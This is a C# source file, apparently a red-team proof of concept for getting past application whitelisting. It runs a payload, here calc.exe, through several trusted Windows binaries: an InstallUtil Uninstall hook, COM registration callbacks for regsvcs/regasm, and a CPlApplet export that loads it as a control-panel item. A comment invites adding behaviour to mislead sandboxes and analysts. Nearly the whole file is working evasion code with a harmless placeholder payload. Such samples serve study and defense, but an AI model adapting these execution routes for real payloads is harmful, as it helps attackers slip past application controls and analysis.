using System;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.EnterpriseServices;
using RGiesecke.DllExport;
using System.Windows.Forms;

[assembly: ApplicationActivation(ActivationOption.Server)]
[assembly: ApplicationAccessControl(false)]

public class Program
{
    public static void Main()
    {
        Console.WriteLine("Hello From Main...I Don't Do Anything");
        //Add any behaviour here to throw off sandbox execution/analysts :)
    }

}

public class Thing0
{
    public static void Exec()
    {
        ProcessStartInfo startInfo = new ProcessStartInfo();
        startInfo.FileName = "calc.exe";
        Process.Start(startInfo);
    }

    public static void ExecParam(string a)
    {
        MessageBox.Show(a);
    }
}

[System.ComponentModel.RunInstaller(true)]
public class Thing1 : System.Configuration.Install.Installer
{
    //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
    public override void Uninstall(System.Collections.IDictionary savedState)
    {

        Console.WriteLine("Hello There From Uninstall");
        Thing0.Exec();

    }

}

[ComVisible(true)]
[Guid("31D2B969-7608-426E-9D8E-A09FC9A51680")]
[ClassInterface(ClassInterfaceType.None)]
[ProgId("dllguest.Bypass")]
[Transaction(TransactionOption.Required)]
public class Bypass : ServicedComponent
{
    public Bypass() { Console.WriteLine("I am a basic COM Object"); }

    [ComRegisterFunction] //This executes if registration is successful
    public static void RegisterClass(string key)
    {
        Console.WriteLine("I shouldn't really execute");
        Thing0.Exec();
    }

    [ComUnregisterFunction] //This executes if registration fails
    public static void UnRegisterClass(string key)
    {
        Console.WriteLine("I shouldn't really execute either.");
        Thing0.Exec();
    }

    public void Exec() { Thing0.Exec(); }
}

class Exports
{

        [DllExport("CPlApplet", CallingConvention = CallingConvention.StdCall)]
        public static bool CPlApplet()
        {
            Thing0.Exec();
            return true;
        }
}
